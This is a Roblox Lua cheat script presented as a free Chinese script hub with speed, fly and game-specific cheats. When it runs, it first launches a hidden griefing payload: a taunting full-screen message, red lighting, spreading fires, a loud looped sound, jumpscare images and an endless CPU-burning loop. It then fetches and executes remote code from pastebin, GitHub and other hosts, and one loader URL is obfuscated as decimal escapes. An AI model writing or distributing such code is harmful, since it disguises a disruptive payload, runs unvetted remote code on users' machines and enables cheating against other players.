local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DestructionWarning"
screenGui.Parent = player.PlayerGui

local textLabel = Instance.new("TextLabel")
textLabel.Name = "WarningText"
textLabel.Parent = screenGui
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "SN脚本中心已经被摧毁了😡😡"
textLabel.TextColor3 = Color3.new(1, 0, 0)
textLabel.Font = Enum.Font.GothamBlack
textLabel.TextSize = 48
textLabel.TextScaled = true
textLabel.ZIndex = 10

Lighting.Ambient = Color3.new(0.5, 0, 0)
Lighting.OutdoorAmbient = Color3.new(0.5, 0, 0)
Lighting.FogColor = Color3.new(0.5, 0, 0)
Lighting.FogEnd = 500

Workspace.Terrain:SetMaterialColor(Enum.Material.Grass, Color3.new(0.5, 0, 0))
Workspace.Terrain:SetMaterialColor(Enum.Material.Ground, Color3.new(0.5, 0, 0))

coroutine.wrap(function()
    while true do
        wait(0.5)
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and math.random() > 0.8 then
                local fire = Instance.new("Fire")
                fire.Parent = part
                fire.Size = math.random(15, 25)
                fire.Heat = math.random(15, 25)
            end
        end
    end
end)()

local sound = Instance.new("Sound")
sound.Name = "HorrorSound"
sound.Parent = SoundService
sound.SoundId = "rbxassetid://138080244"
sound.Looped = true
sound.Volume = 10
sound:Play()

coroutine.wrap(function()
    local ghostImages = {
        "rbxassetid://15044712293",
        "rbxassetid://7192763922"
    }
    
    while true do
        wait(3)
        local ghostGui = Instance.new("ScreenGui")
        ghostGui.Name = "GhostFace"
        ghostGui.Parent = player.PlayerGui
        
        local ghostImage = Instance.new("ImageLabel")
        ghostImage.Name = "GhostImage"
        ghostImage.Parent = ghostGui
        ghostImage.Size = UDim2.new(1, 0, 1, 0)
        ghostImage.BackgroundTransparency = 1
        ghostImage.Image = ghostImages[math.random(1, #ghostImages)]
        ghostImage.ZIndex = 20
        
        wait(1)
        ghostGui:Destroy()
    end
end)()

coroutine.wrap(function()
    while true do
        wait(0.1)
        for i = 1, 1000000 do end
    end
end)()

local finalText = Instance.new("TextLabel")
finalText.Name = "FinalText"
finalText.Parent = screenGui
finalText.Size = UDim2.new(1, 0, 0.2, 0)
finalText.Position = UDim2.new(0, 0, 0.8, 0)
finalText.BackgroundTransparency = 1
finalText.Text = "SN脚本中心已经被1.摧毁了哈哈哈"
finalText.TextColor3 = Color3.new(1, 0, 0)
finalText.Font = Enum.Font.GothamBlack
finalText.TextSize = 36
finalText.TextScaled = true
finalText.ZIndex = 10

local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/FUEx0f3G"))()

local Window = OrionLib:MakeWindow({Name = "1.公益脚本", HidePremium = false, SaveConfig = true,IntroText = "welcome", ConfigFolder = "xianing制作"})
game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "HUB"; Text ="HUB"; Duration = 4; })

local about = Window:MakeTab({
    Name = "公告",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

about:AddParagraph("脚本暂时公益 禁止倒卖")
about:AddParagraph("无")

local Tab =Window:MakeTab({
	Name = "公告",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "复制制作者QQ",
	Callback = function()
     setclipboard("3049653343")
  	end
})

Tab:AddButton({
	Name = "复制1.公益脚本QQ群",
	Callback = function()
     setclipboard("1048659522")
  	end
})

OrionLib:MakeNotification({
	Name = "1.公益脚本中心",
	Content = "欢迎您使用1.公益脚本中心",
	Image = "rbxassetid://4483345998",
	Time = 2

})

local Tab = Window:MakeTab({

    Name = "通用功能🤓",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "玩家本地修改属性"

})

Tab:AddTextbox({

	Name = "跳跃高度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

         -- game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
            print(Value)
	end

})

Tab:AddTextbox({

	Name = "移动速度设置",

	Default = "",

	TextDisappear = true,

	Callback = function(Value)

		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value

	end

})


Tab:AddButton({
	Name = "飞行",
	Callback = function()
     loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
        end
})

local Tab = Window:MakeTab({

    Name = "其他脚本",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({
	Name = "落叶中心",
	Callback = function()
     getgenv().LS="落叶中心" loadstring(game:HttpGet("https://raw.githubusercontent.com/krlpl/Deciduous-center-LS/main/%E8%90%BD%E5%8F%B6%E4%B8%AD%E5%BF%83%E6%B7%B7%E6%B7%86.txt"))()
        end
})

Tab:AddButton({
	Name = "霖溺",
	Callback = function()
     LnScript = "霖溺-免费版加载器"
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShenJiaoBen/ScriptLoader/refs/heads/main/Linni_FreeLoader.lua"))()
        end
})

Tab:AddButton({
	Name = "Rb脚本",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub"))()
        end
})

Tab:AddButton({
	Name = "皮脚本",
	Callback = function()
     getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
        end
})

Tab:AddButton({
	Name = "Z脚本",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ZIONPCE/raw/refs/heads/main/ZiO.lua"))()
        end
})

Tab:AddButton({
	Name = "宿傩",
	Callback = function()
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/6d74b9cd32ce7fa235684299fd1c79b7.lua"))()
        end
})

local Tab = Window:MakeTab({

    Name = "死铁轨脚本（来自1.搬运了2个）",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

local Section = Tab:AddSection({

	Name = "scripts"

})

Tab:AddButton({
	Name = "乌龟刷劵🐢",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hungquan99/HungHub/main/loader.lua"))()
        end
})

Tab:AddButton({
	Name = "国外死铁轨脚本（功能还可以）",
	Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Dead-Rails-Alpha-New-Update-SpiderXHub-30420"))()
        end
})
